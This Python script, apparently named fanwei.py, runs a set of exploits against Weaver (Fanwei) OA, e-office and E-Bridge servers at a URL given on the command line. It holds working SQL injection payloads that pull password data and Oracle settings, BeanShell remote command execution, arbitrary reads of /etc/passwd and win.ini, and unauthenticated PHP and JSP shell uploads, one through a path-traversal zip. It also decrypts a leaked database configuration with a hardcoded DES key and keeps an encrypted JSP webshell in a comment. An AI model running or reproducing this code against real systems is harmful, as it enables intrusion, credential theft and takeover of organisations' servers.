import requests
import urllib3
import re
import json
import base64
import ast
import pyDes
import zipfile
import threading
import sys

urllib3.disable_warnings()

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                         "Chrome/96.0.4664.110 Safari/537.36",
           # "Content-Type": "application/x-www-form-urlencoded",
           }


def V8injection():
    poc = "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select password as id from HrmResourceManager"
    url = host + poc
    q = requests.get(url=url, headers=headers, timeout=3, verify=False)
    if q.status_code == 200 or '访问禁止' not in q.text:
        print(f"{url}\t存在V8injection")
        print("V8injection返回内容为：" + q.text.strip())
    else:
        pass


# WorkflowCenterTreeData 接口注入漏洞(限oracle数据库)
def WorkflowCenterTreeDataInjection():
    url = host + 'mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333'
    data = "formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 "
    try:
        q = requests.post(url=url, data=data, headers=headers, verify=False, timeout=3)
        if q.status_code == 200:
            body = json.loads(q.text)
            if not body:
                pass
                # print("不存在WorkflowCenterTreeDataInjection")
            else:
                print(body)
                print(f"{host}存在WorkflowCenterTreeDataInjection漏洞(限oracle数据库)")
    except Exception as e:
        pass


def BeanShellRCE():
    poc = "/weaver/bsh.servlet.BshServlet"
    try:
        q = requests.get(host + poc, headers=headers, timeout=3, verify=False)
        if "BeanShell" in q.text:
            # 必须使用双引号
            data = {"bsh.script": "exec(\"whoami\")"}
            try:
                qShell = requests.post(host + "/weaver/bsh.servlet.BshServlet", data=data, headers=headers, timeout=3,
                                       verify=False)
                print(f"存在BeanShellRCE，url:{host + poc}")
                print('使用命令exec("whoami")')
                if qShell.status_code == 200:
                    nume = re.findall(r'<pre>\n(.*)\n', qShell.text)
                    nume = nume[0]
                    print(f'当前用户名为{nume}')
                else:
                    print("执行命令失败")
            except:
                print("BeanShellRCE尝试执行exec(\"whoami\")命令失败")
        else:
            pass
    except:
        print("BeanShellRCE POC测试失败")


# 泛微云桥任意文件读取
# “/”只能是一个，多了会失败
def EBridge():
    win = "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C://windows/win.ini&fileExt=txt"
    linux = "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    qWin = requests.get(host + win, headers=headers, timeout=3, verify=False)
    # 判断win/linux
    if "系统找不到指定的路径" not in qWin.text and qWin.status_code == 200:
        id = qWin.json().get('id')
        if len(id) != 0:
            url = host + '/file/fileNoLogin/' + id
            qid = requests.get(url=url, headers=headers, timeout=3, verify=False)
            if qid.status_code == 200 and len(qid.text) is not None:
                print(f"目标服务器为windows，存在泛微云桥任意文件读取,url:{url}")
            else:
                print("目标服务器为windows，无法读取文件")
        else:
            pass
    else:
        qLinux = requests.get(host + linux, headers=headers, timeout=3, verify=False)
        if qLinux.status_code == 200:
            id = qLinux.json().get('id')
            if len(id) != 0:
                url = host + '/file/fileNoLogin/' + id
                qid = requests.get(url=url, headers=headers, timeout=3, verify=False)
                if qid.status_code == 200 and len(qid.text) is not None:
                    print(f"目标服务器为Linux，存在泛微云桥任意文件读取,url:{url}")
                else:
                    print("目标服务器为Linux，无法读取文件")
            else:
                pass


# CNVD-2021-49104   无需登录
# https://xz.aliyun.com/t/10646
def UnauthorizedUploadFile():
    shell = "<?php phpinfo();?>"
    files = {'Filedata': ('test.php', shell, 'image/jpeg')}
    q = requests.post(host + '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=',
                      files=files, timeout=3, verify=False)
    if q.status_code == 200:
        print(f"目标存在UnauthorizedUploadFile，上传成功,访问{host}/images/logo/logo-eoffice.php")
    else:
        pass


# https://github.com/NS-Sp4ce/Weaver-OA-E-cology-Database-Leak/blob/master/OA.py
def DatabaseLeak():
    r = requests.get(host + "/mobile/DBconfigReader.jsp", headers=headers, timeout=3, verify=False)
    body = r.content
    if r.status_code == 200 and len(body) != 0:
        Des = pyDes.des('        ')
        Des.setKey('1z2x3c4v5b6n')
        data = Des.decrypt(body.strip())
        print(f"{host}存在数据库配置信息泄露DatabaseLeak：")
        print(data)


# 未找到复现环境
def LogLeak():
    # hrm / kq / gethrmkq.jsp?filename = 1
    # hrm / kq / gethrmkq.jsp?filename = 1..\1..\1.txt
    pass


proxies = {
    "http": "http://127.0.0.1:8080"
}


# 压缩shell文件，必须使用函数进行封装调用，不然上传成功后解压会出现问题而失败，用于支持WeavUpload
# 上传shell出现问题，玄学问题
def file_zip(mm, webshell_name2):
    # shell = """<%! String xc="1b0679be72ad976a"; String pass="test"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>"""
    shell = "<%out.println(123);%>"
    zf = zipfile.ZipFile(mm + '.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)


# https://www.cnblogs.com/pt007/p/14826313.html
def WeavUpload():
    # 压缩文件
    global s, WeavUpload_shell_url
    mm = 'test_configssss'
    webshell_name1 = mm + '.jsp'
    webshell_name2 = '../../../' + webshell_name1
    file_zip(mm, webshell_name2)
    file = [('file1', (mm + '.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
    url = host + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    try:
        s = requests.post(url=url, files=file, headers=headers, timeout=20, verify=False)
    except Exception as e:
        print(e, "WeavUpload模块上传失败")
    if s.status_code == 200:
        try:
            WeavUpload_shell_url = host + "/cloudstore/" + webshell_name1
            q = requests.get(url=WeavUpload_shell_url, headers=headers, timeout=5, verify=False)
            if q.status_code == 200:
                print(f"WeavUpload模块存在未授权文件上传，shell:{WeavUpload_shell_url}")
            else:
                pass
                # print("WeavUpload模块访问失败")
        except:
            # 此处设置异常：攻击机设置全局代理时触发requests的超时，或者访问时存在超时，此时一概定义为存在漏洞，可能存在极少数的误报，需手动验证
            print(f"请访问{WeavUpload_shell_url}\tWeavUpload模块可能存在误报")


# 未经验证
def PageUpload():
    url = host + "/page/exportImport/uploadOperation.jsp"
    shell = """<%out.println(123);%>"""
    shell_name = 'index_.jsp'
    files = {'file': (shell_name, shell, 'application/octet-stream')}
    q = requests.post(url=url, headers=headers, files=files, timeout=10, proxies=proxies)
    if q.status_code == 200:
        shell_url = host + '/page/exportImport/fileTransfer/' + shell_name
        res = requests.get(url=shell_url, headers=headers, timeout=3, verify=False)
        if res.status_code == 200 and "123" in res.text:
            print(f"PageUpload模块文件上传成功，shell地址:{shell_url}")

# https://qiita.com/shimizukawasaki/items/2608d2081d9a910c616b
# 无POC
def ValidateInjection():
    pass


def main():
    poc = ['V8injection', 'BeanShellRCE', 'EBridge', 'UnauthorizedUploadFile', 'DatabaseLeak', 'LogLeak', 'WeavUpload',
           'PageUpload']

    V8injection()
    BeanShellRCE()
    EBridge()
    UnauthorizedUploadFile()
    DatabaseLeak()
    LogLeak()
    WeavUpload()
    PageUpload()
    WorkflowCenterTreeDataInjection()
    pass


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage:python fanwei.py http://www.test.com")
        exit()
    else:
        host = sys.argv[1]
        if host[-1] == '/':
            host = host[:-1]
        else:
            host = host
    main()
